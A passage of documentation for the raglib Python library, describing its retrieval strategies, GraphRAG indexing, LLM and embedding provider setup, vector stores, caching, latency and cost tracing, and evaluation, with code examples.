| **`"self"`** | `SelfRAG` | Retrieve-decision -> IsRel -> generate -> IsSup (revise) -> IsUse, with a hard `max_llm_calls` budget | 4–10 | Strict hallucination control |
| **`"agentic"`** | `AgenticRAG` | ReAct loop choosing `search_docs` / `search_web` / `graph_search` / your `tools` until it has enough evidence | 2–5 | Multi-step research, tool use |
| **`"multi_query"`** | `MultiQueryRAG` | Paraphrases -> parallel retrieval -> RRF | 2 | Vague questions |
| **`"multi_hop"`** | `MultiHopRAG` | Retrieve -> "what is still missing?" -> next hop from the evidence (bridge entities) | 2–4 | A -> B -> answer questions |
| **`"routing"`** | `RoutingRAG` | One-word routing to corpus / web / corpus+web / graph | 2 | Mixed workloads |
| **`"memory"`** | `MemoryRAG` | Per-session history + standalone-question condensation | 1–2 | Chat assistants |
| **`"web"`** | `WebRAG` | Web search -> cited answer | 1 | Live research |
| **`"tool"`** | `ToolAugmentedRAG` | Fuses retrieval with your `tool_call_hook(query, docs)` | 1 | Deterministic tool calls |
| **`"graph"`** | `GraphRAG` | Knowledge-graph local/global search (section 8) | 1 local, 1 + N global | Relationship & corpus-wide questions |

\* Excluding the optional rewrite/condense steps.

### Counting and aggregate questions (`SQLTool`)

Retrieval answers from the top-k chunks, so a question like "how many engineers are based in Tokyo?" over a 5,000-row table cannot be counted correctly: the model only ever sees a few chunks. For tabular data, give the agent an `SQLTool`. The LLM writes one read-only `SELECT`, which SQLite runs over every row:

```python
from raglib import RAG, SQLTool

rag = RAG("people.csv", llm="openai", rag_type="agentic", tools=[SQLTool.from_files("people.csv")])
print(rag.query("How many engineers are based in Tokyo?").answer)
```

`SQLTool` loads `.csv`, `.tsv`, `.xlsx`, `.json` and `.jsonl` files (or `add_rows(table, header, rows)`) into a private in-memory SQLite database. An SQLite authorizer allows only reads, so writes, `ATTACH` and `PRAGMA` are refused. Queries time out after `timeout_seconds` (default 5) and results are capped at `max_rows`.

**Web search is never used unless you configure it** (`web_search_provider=...`). The exceptions are `web` and `hybrid_web`, which default to DuckDuckGo. Corrective RAG without a web provider retries the corpus with a refined query instead.

---

## 8. GraphRAG (Knowledge-Graph RAG)

`rag_type="graph"` builds a knowledge graph from your chunks (Microsoft GraphRAG style) and answers with it:

1. **Indexing**: one LLM call per new chunk extracts entities + relations (in parallel, cached by content hash). Entities are merged across chunks and embedded into a separate entity index.
2. **Communities** (lazy): Leiden (with `graspologic`) or Louvain (networkx) clusters the graph hierarchically. The LLM writes a report per community, and only changed communities are re-summarized.
3. **Local search** (*default for specific questions*): query → similar entities → 1–2 graph hops → the chunks that mention them + entity / relationship / community context, fused with normal hybrid chunk retrieval. **No extra LLM calls**, so latency is the same as vector RAG.
4. **Global search** (for "main themes / overall / across all documents" questions): the most query-relevant community reports (`top_communities`, default 20) are mapped to scored key points in parallel, and the generator writes the cited summary.

```python
from raglib import RAG

rag = RAG(
    source="research_papers/",
    rag_type="graph",
    chat_llm="openai",
    embedding_llm="openai",
    graph_store="networkx",            # or "neo4j" with graph_kwargs={"store_options": {...}}
    graph_kwargs={
        "entity_types": ["PERSON", "ORGANIZATION", "METHOD", "DATASET"],
        "max_workers": 8,              # parallel extraction / reports
        "gleanings": 0,                # extra "anything missed?" passes (recall vs cost)
        "hops": 1,                     # local-search graph expansion
        "top_communities": 20,         # global-search map width
        "community_rebuild_threshold": None,  # auto-rebuild after N new chunks (None = lazy)
    },
    search_mode="auto",                # "auto" | "local" | "global"
)

print(rag.query("Which datasets did the authors of the YOLO paper also use?").answer)        # local
print(rag.query("What are the main research themes across these papers?").answer)          # global
rag.save("./graph_index")             # graph + extraction cache + vectors
```

Neo4j: `RAG(..., rag_type="graph", graph_store="neo4j", graph_kwargs={"store_options": {"uri": "bolt://localhost:7687", "user": "neo4j", "password": "...", "namespace": "papers"}})`.

**Indexing cost.** Building the graph takes one LLM call per chunk, plus one per community report. That is thousands of calls for a few hundred long documents, and indexing is the dominant GraphRAG cost. Use a cheaper or faster model for it with `graph_llm`; answers still use `llm`:

```python
rag = RAG("docs/", rag_type="graph", llm="openai/gpt-4.1", graph_llm="openai/gpt-4.1-nano")
```

`graph_llm` builds the graph (entity extraction, community reports, the global-search map step). Its key comes from `chat_api_key` only when it is the same provider, otherwise from its environment variable. With a reasoning model, turning thinking off for extraction is about 10× faster (see *Custom Providers*, `extra_body`).

To give **agentic** or **routing** pipelines a `graph_search` tool / route, pass `enable_graph=True`.

---

### Free Models, Rate Limits & Fallbacks

Free tiers (OpenRouter `:free` models, Groq, Gemini free) are rate limited. raglib handles that for you:

```python
rag = RAG(
    "docs/",
    llm="openrouter/nvidia/nemotron-3-ultra-550b-a55b:free",
    llm_fallbacks=["openrouter/cohere/north-mini-code:free"],   # used when the primary is down / rate limited
    embedding_llm="openrouter/nvidia/nemotron-3-embed-1b:free",
)
```

- **Client-side rate limit:** `llm_rpm=` caps requests per minute. Chat and embedding calls with the same provider and key share one budget. OpenRouter `:free` models default to their 20/min limit, and `llm_rpm=0` disables it.
- **Retries:** transient errors (429, 5xx, timeouts) are retried `llm_max_retries` times, waiting as long as the server asks (`Retry-After`, `X-RateLimit-Reset`).
- **Quota errors fail fast:** daily caps and out-of-credit errors raise `raglib.llm.resilience.QuotaExceededError` immediately instead of retrying for hours.
- **Fallbacks:** `llm_fallbacks` tries each `"provider/model"` in order when a call still fails after retries.
- **Free-tier budget:** an OpenRouter free account allows about 50 free-model requests per day, and embeddings count. A typical query is 1 LLM call (plus 1 embedding), and GraphRAG costs 1 call per chunk at ingestion.

Checked live with OpenRouter free models (October 2026):

| Test | Result |
| :--- | :--- |
| Needle in a haystack: 4 needles in 95 chunks (16 hard negatives such as other cities' travel caps and other projects' codes), one question paraphrased ("Iceland's capital" for Reykjavik) | Dense and hybrid: all 4 needles at rank 1. BM25 alone missed the paraphrase. Answers 3/3 exact with citations. |
| GraphRAG local, 3-hop question across 3 documents plus a distractor | Correct ("Lisbon"): 25 entities and 24 relations extracted, 0 LLM calls before generation |
| GraphRAG global ("main themes across all documents") | 5 community reports and a cited summary |
| GraphContextWindow | Graph built in 21 ms without an LLM; answer correct. With `embedding=`, the paraphrased needle moved from not found to rank 1. |

## 9. Standalone Graph-Based Context Window (`GraphContextWindow`)

`GraphContextWindow` is a lightweight, LLM-optional alternative for **conversational context assembly**. It builds a hierarchical **Document → Section → Chunk** graph plus a **chat-turn graph**. Every `GraphNode` stores `connected_nodes: List[ConnectedNodeRef]` (neighbour id, relation, keywords, 1-line summary), so multi-hop movement happens by looking ahead at summaries. Seeds come from an inverted index, so query time depends on matches, not graph size. Pass `embedding=` (any raglib embedding) to add semantic seeding, so paraphrased questions still find the right chunk: `GraphContextWindow(embedding=EmbeddingFactory.build("huggingface"))`. For knowledge-graph RAG over a corpus, use **GraphRAG** (section 8).

### Graph Node Hierarchy & Edge Relations

1. **Document Hierarchy (`DocumentNode -> SectionNode -> ChunkNode`):**
   - `HAS_SECTION` / `PART_OF`: Links `DocumentNode` <-> `SectionNode`
   - `HAS_CHUNK` / `PART_OF`: Links `SectionNode` <-> `ChunkNode`
   - `PREV_SECTION` / `NEXT_SECTION`, `PREV_CHUNK` / `NEXT_CHUNK`: Sequential navigation with neighbour summaries
   - `SHARED_ENTITY`: Connects chunks across sections or documents that share entities or keywords
2. **Conversational Chat Graph (`chat_turn` nodes):**
   - `PREV_TURN` / `NEXT_TURN`: Chronological turn links
   - `SAME_TOPIC_TURN`: Links non-adjacent turns that share entities/keywords (survives topic switches)
   - `CITED_CHUNK` / `DISCUSSED_IN_TURN`: Bridges chat turns to the chunks used to answer them

### Complete `GraphContextWindow` Example

```python
from raglib import Document, GraphContextWindow, MockLLMClient

graph = GraphContextWindow(
    llm_client=MockLLMClient(),     # Optional: any BaseLLMClient for LLM semantic chunking
    chunking_strategy="llm",        # "llm" | "recursive" | "fixed"
    chunk_size=120,
    chunk_overlap=20,
    max_context_tokens=1000,
)

graph.add_documents([
    Document(
        id="crag_doc",
        content=(
            "# Section 1: CorrectiveRAG Evaluation\n"
            "CorrectiveRAG scores every retrieved chunk with a relevance grader.\n"
            "When grading fails, the Refiner rewrites the query and WebRetriever runs a search."
        ),
        source="crag_architecture.md",
    ),
    Document(
        id="gateway_doc",
        content="# Section 1: External Search Routing\nWebRetriever dispatches queries to the configured provider.",
        source="gateway.md",
    ),
])

ctx_turn1 = graph.build_context_window("How does CorrectiveRAG evaluate chunks?", top_k_seeds=2, max_hops=1)
graph.add_chat_turn(
    query="How does CorrectiveRAG evaluate chunks?",
    answer="It grades retrieved chunks with a relevance grader.",
    cited_documents=ctx_turn1.documents,
)

result = graph.build_context_window(
    query="What happens next after grading fails, and how does WebRetriever handle it?",
    top_k_seeds=2,
    max_hops=2,
)
for step in result.traversal_trace:
    print(" -", step)
print(result.formatted_context)

docs = graph.retrieve("relevance grader", top_k=3)   # drop-in List[Document]
```

---

## 10. LLM, Embedding, Vision & Vector Store Configuration

### Supported Chat Providers (`llm` / `chat_llm`)

Pass a provider name (`llm="deepseek"`) or `provider/model` (`llm="openrouter/meta-llama/llama-3.3-70b-instruct"`).
Hosted OpenAI-compatible APIs only need `pip install "raglib-py[openai]"`.

| Provider | `llm` value | Default model | API key env var | Embeddings |
| :--- | :--- | :--- | :--- | :--- |
| **OpenAI** | `"openai"` | `gpt-4.1-mini` | `OPENAI_API_KEY` | yes |
| **Anthropic** | `"anthropic"` | `claude-haiku-5-5` | `ANTHROPIC_API_KEY` | – |
| **Google Gemini** | `"google"` / `"gemini"` | `gemini-2.5-flash` | `GOOGLE_API_KEY` / `GEMINI_API_KEY` | yes |
| **OpenRouter** (300+ models with one key) | `"openrouter"` | `openai/gpt-4.1-mini` | `OPENROUTER_API_KEY` | – |
| **Groq** | `"groq"` | `llama-3.3-70b-versatile` | `GROQ_API_KEY` | – |
| **DeepSeek** | `"deepseek"` | `deepseek-chat` | `DEEPSEEK_API_KEY` | – |
| **Mistral** | `"mistral"` | `mistral-small-latest` | `MISTRAL_API_KEY` | yes (`mistral-embed`) |
| **Together AI** | `"together"` | `meta-llama/Llama-3.3-70B-Instruct-Turbo` | `TOGETHER_API_KEY` | with `embedding_model` |
| **Fireworks AI** | `"fireworks"` | `accounts/fireworks/models/llama-v3p3-70b-instruct` | `FIREWORKS_API_KEY` | with `embedding_model` |
| **xAI Grok** | `"xai"` / `"grok"` | `grok-3-mini` | `XAI_API_KEY` | – |
| **Perplexity** | `"perplexity"` | `sonar` | `PERPLEXITY_API_KEY` | – |
| **Cerebras** | `"cerebras"` | `llama-3.3-70b` | `CEREBRAS_API_KEY` | – |
| **NVIDIA NIM** (build.nvidia.com or self-hosted via `NVIDIA_BASE_URL`) | `"nvidia"` / `"nim"` | `nvidia/nemotron-3.5-lightning-30b-a3b` | `NVIDIA_API_KEY` | yes (`nvidia/nemotron-3.5-embed-1b`); OCR with `nvidia/nemotron-3.5-super-vl-120b-a12b` |
| **Azure OpenAI** | `"azure/<deployment>"` | – | `AZURE_OPENAI_API_KEY` + `AZURE_OPENAI_ENDPOINT` | yes (deployment) |
| **Ollama** (local) | `"ollama"` | `llama3.1` | – | yes |
| **LM Studio** (local) | `"lmstudio/<model>"` | – | – | with `embedding_model` |
| **vLLM** (self-hosted) | `"vllm/<model>"` + `chat_base_url` | – | – | with `embedding_model` |
| **Any OpenAI-compatible API** | `"openai_compatible/<model>"` + `chat_base_url` | – | `OPENAI_COMPATIBLE_API_KEY` | with `embedding_model` |
| **Your own provider** (`register_provider` / JSON file) | `"<id>/<model>"` | first listed model | your choice | with `embedding_model` |
| **Any LangChain chat model / `BaseLLMClient`** | the object | – | – | – |
| **Mock (offline)** | `"mock"` or `offline=True` | templated | – | mock |

The provider is also detected from the key prefix (`sk-or-` OpenRouter, `sk-ant-` Anthropic, `gsk_` Groq,
`xai-`, `pplx-`, `csk-`, `AIza`, `sk-` OpenAI). DeepSeek keys also start with `sk-`, so name the provider explicitly.
OpenRouter requests send `X-Title: raglib`; override with `OPENROUTER_APP_NAME` / `OPENROUTER_SITE_URL`.

```python
from raglib import RAG

rag = RAG("docs/", llm="openrouter/anthropic/claude-sonnet-4")                  # chat via OpenRouter
rag = RAG("docs/", llm="deepseek", embedding_llm="huggingface")                  # DeepSeek + local embeddings
rag = RAG("docs/", llm="mistral")                                                # Mistral chat + mistral-embed
rag = RAG("docs/", llm="lmstudio/qwen2.5-7b-instruct", embedding_llm="ollama")   # fully local
rag = RAG("docs/", llm="vllm/Qwen/Qwen2.5-7B-Instruct", chat_base_url="http://gpu:8000/v1")
```

All provider calls get a timeout (`llm_timeout`), retries with jittered exponential backoff on rate limits / 5xx (`llm_max_retries`) and an LRU response cache (`llm_cache`).

raglib needs no SDK and no LangChain for any of these providers. `raglib.llm.clients` speaks the three wire protocols directly with the Python standard library: **OpenAI Chat Completions** (OpenAI, Azure, Groq, Ollama, OpenRouter and every other compatible API), **Anthropic Messages** and **Gemini `generateContent`**, including SSE streaming, JSON mode and real token usage. Build one directly with `from raglib.llm import build_chat_client; llm = build_chat_client("anthropic")`. A LangChain chat model you already have still works: pass it as `chat_llm=` and raglib wraps it with its retries and usage tracking.

### Custom Providers (any third-party or self-hosted API)

Register any provider that speaks one of the three supported APIs (`openai` Chat Completions, `anthropic` Messages, `gemini` generateContent), then use it like a built-in one:

```python
from raglib import RAG, register_provider

register_provider(
    "myprovider",                              # lowercase letters, numbers, - or _
    name="My AI Provider",                     # shown by `raglib providers`
    api="openai",                              # "openai" | "anthropic" | "gemini"
    base_url="https://api.myprovider.com/v1",
    api_key="{env:MYPROVIDER_API_KEY}",        # optional; leave out when auth is in headers
    headers={"X-Team": "{env:MY_TEAM_ID}"},    # optional extra headers ({env:NAME} is expanded)
    models=[
        {"id": "model-id", "name": "Display Name"},
        {"id": "model-r1", "name": "Reasoner", "reasoning": True},
        {"id": "model-vl", "name": "Vision", "image": True},
    ],
    embedding_model="embed-v1",                # optional: semantic search through the same provider
)

rag = RAG("docs/", llm="myprovider/model-id")   # or llm="myprovider" for the first listed model
```

| Model flag | Effect |
| :--- | :--- |
| `reasoning: true` | No `temperature` is sent (many reasoning endpoints reject it). A leading `<think>...</think>` block is removed from answers and streams for every model, so citations and JSON parsing keep working. |
| `image: true` | The model can read scanned PDF pages: it is used for OCR when it is the chat model, or with `vision_llm="myprovider/model-vl"`. |

Models you don't list still work (`llm="myprovider/any-model"`). The list sets the default model and the flags.

Reasoning models spend completion tokens on thinking before they answer. A small `llm_max_tokens` can be used up entirely by the thinking, which leaves the answer empty, so leave it unset or generous for these models.

More options for servers with their own conventions:

| Option | Example | Use |
| :--- | :--- | :--- |
| `extra_body` | `{"chat_template_kwargs": {"enable_thinking": False}}` | Extra JSON fields for every chat request (vLLM / NVIDIA NIM sampling or template options). Turning thinking off for NVIDIA Nemotron cut a lookup answer from 357 to 10 completion tokens and from 2.7 s to 0.5 s in testing. |
| `embedding_input_types` | `["passage", "query"]` | Asymmetric embedding models that require an `input_type` field: documents get the first value, search queries the second. |
| `embedding_params` | `{"truncate": "END"}` | Extra JSON fields for embedding requests. |
| `stream_usage` | `true` | The server accepts `stream_options.include_usage`, so streamed answers report real token counts. |

**From a JSON file** (no code). Use `load_providers("providers.json")`, set `RAGLIB_PROVIDERS_FILE=providers.json`, or pass `raglib ask ... --providers providers.json`:

```json
{
  "providers": {
    "myprovider": {
      "name": "My AI Provider",
      "api": "openai",
      "base_url": "https://api.myprovider.com/v1",
      "api_key": "{env:MYPROVIDER_API_KEY}",
      "headers": {"X-Team": "search"},
      "models": {
        "model-id": {"name": "Display Name", "reasoning": false, "image": false}
      },
      "embedding_model": "embed-v1"
    }
  }
}
```

Keep keys out of the file with `{env:NAME}`; raglib warns when a file holds a literal key. A key given for one provider is never sent to another provider's host. Built-in provider ids can't be redefined, and `raglib providers` lists custom providers with their models.

### Supported Embedding Providers (`embedding_llm`)

| Provider | `embedding_llm` Value | Default Model | Notes |
| :--- | :--- | :--- | :--- |
| **OpenAI** | `"openai"` | `text-embedding-3-small` | `embedding_api_key` or `OPENAI_API_KEY` |
| **Google** | `"google"` | `models/gemini-embedding-001` | `embedding_api_key` or `GOOGLE_API_KEY` |
| **Ollama** | `"ollama"` | `nomic-embed-text` | Local Ollama server |
| **Mistral** | `"mistral"` | `mistral-embed` | `MISTRAL_API_KEY` |
| **OpenRouter** | `"openrouter/<model>"` | – (pass a model) | e.g. `"openrouter/nvidia/nemotron-3-embed-1b:free"`; same `OPENROUTER_API_KEY` as chat |
| **Any OpenAI-compatible** | `"together/<model>"`, `"vllm/<model>"`, `"lmstudio/<model>"`, `"azure/<deployment>"` | – | Uses that provider's endpoint |
| **HuggingFace** | `"huggingface"` / `"local"` / `"free"` | `sentence-transformers/all-MiniLM-L6-v2` | Local CPU/GPU |
| **None** | `"none"` | – | BM25 keyword retrieval only |
| **Mock** | `"mock"` | Feature-hashed vectors | Tests only |

If `embedding_llm` is omitted, raglib uses the chat provider's embeddings (OpenAI / Google / Mistral / Ollama), else local HuggingFace if installed, else **BM25-only with a warning**. It never silently falls back to fake vectors. Embeddings are batched (64) and cached by content hash. A chat API key is only reused for embeddings from the same provider, so an OpenRouter key is never sent to OpenAI.

### Vector Stores (`vector_db`)

- **`"memory"`** *(default)*: in-RAM cosine search (numpy-accelerated when installed), persisted with `rag.save()` / `rag.load()`.
- **`"qdrant"`**: Qdrant (`pip install raglib-py[qdrant]`). In-process by default; `vector_db_kwargs={"path": "./qdrant"}` persists to disk, `{"url": "http://localhost:6333", "api_key": ...}` uses a server or Qdrant Cloud. Filters run inside Qdrant. On a collection in strict mode that rejects filters on unindexed keys (Qdrant Cloud), raglib creates a payload index for each key a filter uses, the first time it is used (`vector_db_kwargs={"payload_indexes": True | False}` to force it on or off). Each index costs Qdrant memory, and the first query that needs one waits while it is built.
- **`"pgvector"`**: PostgreSQL with the pgvector extension (`pip install raglib-py[pgvector]`), e.g. `vector_db_kwargs={"dsn": "postgresql://user:pass@host/db", "table_name": "docs"}`. Uses an HNSW cosine index when available; filters become parameterized SQL on a JSONB column.
- **`"chroma"`**: ChromaDB in cosine space. Each `RAG` gets its **own collection** unless you name one, so instances never see each other's data. Use `{"persist_directory": ..., "collection_name": ...}` for a durable index or `{"host": ..., "port": ...}` for a Chroma server. Never expose a Chroma server to untrusted networks: chromadb has open advisories in its server (pre-auth code injection, authorization) with no fixed release yet (checked 2026-11-26).
- **Your own**: subclass `BaseVectorStore` (`upsert`, `query(filters=...)`, `delete`, `count`).

Filters select the same documents in every store, list-valued fields included (`{"department": "legal"}` matches `["hr", "legal"]`). The access-control and filter tests in `tests/integration/` run against every store: the in-process ones always, and live pgvector and Qdrant (plain and strict mode) after `docker compose -f docker-compose.test.yml up -d --wait`. The live ones are skipped when the servers are not running.

Initialization errors are raised. Pass `vector_db_kwargs={"fallback_to_memory": True}` to opt into a fallback. Every store refuses vectors of a different size than the ones it holds, so switching embedding models fails loudly instead of returning meaningless matches.

---

## 11. Web Search Providers (All 9 Providers)

Web search is **off by default**. Enable it with `web_search_provider`:

| Provider Name | Auth Required? | Key / Extra Parameters |
| :--- | :--- | :--- |
| **`"duckduckgo"`** | No (Free) | `pip install raglib-py[web]` |
| **`"local"`** | No (Offline) | Lexical search over the loaded corpus (tests / demos) |
| **`"tavily"`** | Yes | `web_search_api_key` (or `TAVILY_API_KEY`) |
| **`"serpapi"`** | Yes | `web_search_api_key` (or `SERPAPI_API_KEY`) |
| **`"brave"`** | Yes | `web_search_api_key` (or `BRAVE_API_KEY`) |
| **`"bing"`** | Yes | `web_search_api_key` (or `BING_SEARCH_V7_SUBSCRIPTION_KEY`) |
| **`"google_cse"`** | Yes | `web_search_api_key` + `web_search_cse_id` |
| **`"exa"`** | Yes | `web_search_api_key` (or `EXA_API_KEY`) |
| **`"searxng"`** | Optional | `web_search_base_url` (+ optional `web_search_api_key`) |

---

## 12. Conversations, Streaming, Async & Tracing

```python
from raglib import RAG

rag = RAG(source="docs/", chat_llm="openai", rag_type="memory")   # or memory=True with any rag_type

# Each user gets an isolated, token-bounded history; follow-ups are rewritten into
# standalone questions before retrieval ("Which services depend on it?" -> "...on AuthService?")
rag.query("What is our authentication service called?", session_id="user-42")
rag.query("Which downstream services depend on it?", session_id="user-42")
rag.reset_memory("user-42")

# Persist conversations across restarts and worker processes
from raglib import SQLiteConversationStore
rag = RAG("docs/", chat_llm="openai", memory=True, conversation_store=SQLiteConversationStore("chats.db", ttl_seconds=86400))

# Streaming
for token in rag.stream("Summarize the onboarding guide"):
    print(token, end="", flush=True)

# Async (FastAPI etc.)
# result = await rag.aquery("...", session_id=request.user_id)

# Tracing: every stage is timed; plug in LangSmith / OpenTelemetry / logging
rag = RAG("docs/", chat_llm="openai", on_event=lambda e: print(e.stage, e.latency_ms, e.meta))
result = rag.query("...")
print(result.usage)            # answer call + totals over every LLM call of the query (see below)
print(result.metadata.get("degraded"))  # optional steps that failed and fell back, if any

rag.chat()                     # interactive terminal session with memory
```

### Per-stage latency (P50 / P95 / P99)

Every query is timed stage by stage: `query_rewrite`, `query_embedding`, `dense_search`, `filtering`, `bm25_search`, `fusion`, `rerank`, `prompt_build`, `generate` (the LLM call only), `post_process`, and `total` (wall time). Each event carries `parent`, so `dense_search` shows up under `retrieve`. `LatencyStats` aggregates those events over many queries:

```python
from raglib import RAG, LatencyStats

stats = LatencyStats(window=10_000, cold_start_after_s=300)   # rolling window per stage, thread-safe
rag = RAG("docs/", llm="openai", preset="production", on_event=stats)
for question in questions:
    rag.query(question)

stats.print_report()
# stage              count   p50 ms   p95 ms   p99 ms   min ms   max ms
# query_embedding      500    41.20    88.10   131.40    30.02   410.77
# rerank               500   212.55   301.90   356.12   180.33   498.10
# generate             500   812.40  1610.25  2380.70   402.11  4100.90
# ...
stats.report()["generate"]["p95"]        # the same numbers as a dict
for sample in stats.slowest("generate", 3):   # why were they slow?
    print(sample.duration_ms, sample.tags)    # cache_hit, query_tokens, num_candidates, reranker_used, is_cold_start
```

- **Several observers**: `on_event` accepts a list, e.g. `on_event=[stats, PrometheusExporter(), OpenTelemetryExporter()]`.
- **Prometheus** (`pip install raglib-py[prometheus]`): a `raglib_stage_duration_seconds` histogram labelled `stage` and `status`.
- **OpenTelemetry** (`pip install raglib-py[otel]`): one `raglib.query` trace per question, with a nested span per stage at its real start and end time.
- **Benchmark**: `benchmark(rag, queries, repeats=5)` returns a `LatencyStats`. It clears the caches before each query unless `warm_cache=True`. From the shell: `python benchmarks/latency/bench_latency.py --source docs/ --queries questions.txt --llm openai --preset production --slowest generate`. It runs offline with a sample corpus if you leave out `--llm`.
- One sample is recorded per stage execution, so a multi-query run that embeds 4 queries adds 4 `query_embedding` samples. Filters are applied inside the vector store's search (a pre-filter), so their cost is part of `dense_search` / `bm25_search`. `filtering` times the re-check of dense hits.

### Caching, cache invalidation and model routing

```python
rag = RAG(
    "docs/", llm="openai/gpt-4.1",
    embedding_cache_ttl=24 * 3600,      # repeated questions reuse their query embedding for a day
    answer_cache=True,                  # FAQ tier: same question -> cached answer, no LLM call
    cheap_llm="openai/gpt-4.1-nano",    # short factual questions go to the cheap model
    reranker="cross_encoder",
    rerank_skip_threshold=0.85,         # confident top hit -> skip the reranker (calibrate per embedding model)
)
result = rag.query("When do offices close?")
result.metadata["tier"]               # "faq" | "cheap" | "full" (also tagged on the trace for LatencyStats)

# Event-driven invalidation: call this from the job that updates the corpus
rag.on_document_update(source="docs/")          # re-ingest; answers built from changed documents are dropped
rag.on_document_update(doc_ids=["policy.md"])   # a document changed elsewhere
rag.invalidate("policy.md"); rag.invalidate_all()
```

- **Caches and invalidation are per process for now.** The LLM cache, embedding cache and answer cache live in the memory of one Python process, and `invalidate()` / `on_document_update()` / `delete()` only reach that process. With several workers or servers, each keeps its own caches: an update made through one worker does not clear the others, which keep serving cached answers until their TTL (24 h for the LLM cache by default). Until a shared backend (e.g. Redis) exists, run ingestion and queries in one process, call `on_document_update()` on every worker, or lower `llm_cache_ttl`.
- Every document has a version (a hash of its content and permissions). A cached answer is served only while the versions of all its sources are unchanged. Re-ingesting a changed document also drops the LLM responses and vectors built from it.
- **Public tier only:** a query with `user=` or `filters=` never reads or writes the LLM cache or the answer cache, unless you pass `cache_personalized=True`.
- `prompt_caching=True` sends Anthropic `cache_control` on the system prompt. It does nothing for other providers, which cache automatically or not at all.
- `tier_router` takes any `callable(question, context) -> "faq" | "cheap" | "full"`. `context` has `answer_cached`, `cheap_available` and `personalized`. The default `HeuristicTierRouter` makes no LLM call.

### Cost in USD

```python
from raglib import CostReport, PriceTable

prices = PriceTable(
    llm={"openai/gpt-4.1": (2.00, 8.00), "openai/gpt-4.1-nano": (0.10, 0.40)},  # USD per 1M input / output
    embedding={"text-embedding-3-small": 0.02},                                # USD per 1M tokens
    search={"cohere": 2.00, "web:tavily": 8.00},                               # USD per 1K searches
    vector_db_monthly=58.0,
)
costs = CostReport(prices)
rag = RAG("docs/", llm="openai/gpt-4.1", prices=prices, on_event=costs)
rag.query("...").usage["cost_by_stage"]      # {"generate": 0.0041, "query_embedding": 2e-07, "rerank": ...}
costs.print_report(queries_per_day=10_000)  # totals, per stage and model, monthly projection (LLM vs vector DB)
rag.ingest_usage()                          # tokens and USD spent on ingestion (embeddings, graph extraction)
```

raglib ships no built-in prices, because prices change and a silently wrong default is worse than an explicit `cost_unpriced` list. Prompt-cache tokens are priced at 0.1x (read) and 1.25x (write) of the input price unless you set them per model. Embedding tokens are estimated locally.

### Trade-offs

Every speed or cost option buys something with something else:

| Option | You gain | You pay | Rule |
| :--- | :--- | :--- | :--- |
| `rerank_skip_threshold` | the rerank stage on confident queries (30-40% of rerank cost in the source talk's example) | a confident-looking wrong top hit is no longer corrected; cosine scales differ per embedding model | calibrate on a golden eval set and compare accuracy with and without it |
| `rerank_candidates` 10 -> 20+ | better recall for the reranker | more rerank latency (the "silent killer" stage) | measure the `rerank` P95 with `LatencyStats` |
| `top_k=3` instead of 5 | ~40% fewer context tokens | the answer may lose supporting evidence | check `precision@k` / `recall@k` with `raglib.eval` |
| `answer_cache` (FAQ tier) | no retrieval and no LLM call on repeats | everyone gets the same answer; wording variants miss | public tier only; invalidate on document updates |
| `cache_personalized=True` | cache hits for logged-in users | a cache keyed on the question is wrong when the answer depends on who asked | leave it off unless answers don't depend on the user |
| `llm_cache_ttl` / `embedding_cache_ttl` | bounded memory, refreshed answers | repeated work is paid again after the TTL | use TTLs as a backstop; invalidate on events |
| `cheap_llm` + routing | most queries on the cheap path | two model integrations; misrouted hard questions get weaker answers | the router must be fast and accurate: measure per tier |
| `prompt_caching` | ~90% cheaper cached system-prompt tokens | 1.25x write cost; no effect below the model's minimum prompt length (512-4096 tokens) | only with a long, stable system prompt |
| `chunking_strategy="embedding"` | chunks end at topic changes | ~2x embedding tokens, slower ingestion | high-value documents only |
| `parent_retrieval` | answers see whole sections | larger prompts, fewer sources per prompt | small children (~200 tokens), parents <= 2000 |
| `chunk_overlap` 20% -> 50% | fewer facts split across chunks | more chunks to embed and store | 20% by default, 50% for dense technical text |

---

## 13. Evaluation

```python
from raglib import RAG
from raglib.eval import evaluate
from raglib.llm import build_chat_client

rag = RAG("docs/", chat_llm="openai", embedding_llm="openai")
dataset = [
    {"question": "What is the refund window?", "relevant_ids": ["docs/refunds.md"], "reference": "30 days"},
]
judge = build_chat_client("openai", model_name="gpt-4.1")   # use a strong judge model
report = evaluate(rag, dataset, judge_llm=judge, k=5)
print(report)   # hit_rate@5, mrr@5, precision@5, recall@5, ndcg@5, faithfulness, answer_relevance, context_precision, correctness, latency_ms
```

`relevant_ids` can be chunk ids, parent document ids or file paths. Run it in CI to catch retrieval regressions when you change chunking, models or fusion settings.

---

## 14. Building Custom Pipelines from Core Components

Every component is exported from `raglib`, so you can assemble pipelines without the facade:

```python
from raglib import (
    CorrectiveRAG,
    Document,
    Generator,
    MockLLMClient,
    Refiner,
    RelevanceGrader,
    Reranker,
    Retriever,
)

corpus = [
    Document(id="d1", content="HNSW indexes accelerate approximate nearest neighbor search."),
    Document(id="d2", content="Corrective RAG grades chunks and refines knowledge strips."),
]

llm = MockLLMClient()                                   # use build_chat_client("openai") in production
pipeline = CorrectiveRAG(
    retriever=Retriever(documents=corpus, top_k=4),     # BM25 only; pass embedding=... for hybrid
    grader=RelevanceGrader(llm_client=llm),
    refiner=Refiner(llm_client=llm),
    reranker=Reranker(top_k=3),
    generator=Generator(llm_client=llm, max_context_tokens=600),
    llm_client=llm,
)

result = pipeline.run("How does Corrective RAG handle low-scoring chunks?")
print(result.answer, result.reasoning_trace)
```

Subclass `BaseRAG` and override `retrieve(ctx)` (or `process_documents` / `generate` / `answer`) to build your own strategy. Condensation, memory, tracing, citations, streaming, token usage and degradation reporting come for free. If you keep the default `retrieve`, it routes each query with `DecisionEngine` (corpus / web / both / none) and retries poor lexical matches with `Refiner`; the built-in strategies replace that step with their own.

Custom `BaseLLMClient` implementations can report token usage with `raglib.core.runtime.record_usage(prompt_tokens, completion_tokens)`, and custom steps can report fallbacks with `report_degraded("my_step", exc)` inside their `except` block.

---

## 15. Core Data Schemas

```python
from raglib import Document, GenerationResult, Citation, TraceEvent, QueryResult, GraphNode, ConnectedNodeRef
```

- **`Document`**: `id`, `content`, `metadata` (`parent_id`, `chunk_index`, `prev_id`, `next_id`, `file`, ...), `score`, `source`
- **`GenerationResult`**:
  - `answer: str`
  - `sources: List[Document]` — the exact context given to the model, in prompt order
  - `citations: List[Citation]` — `[n]` markers in the answer mapped to sources (`index`, `document_id`, `source`, `snippet`)
  - `reasoning_trace: List[str]` — human-readable pipeline steps
  - `trace_events: List[TraceEvent]` — `stage`, `latency_ms`, `meta`, `error` per stage
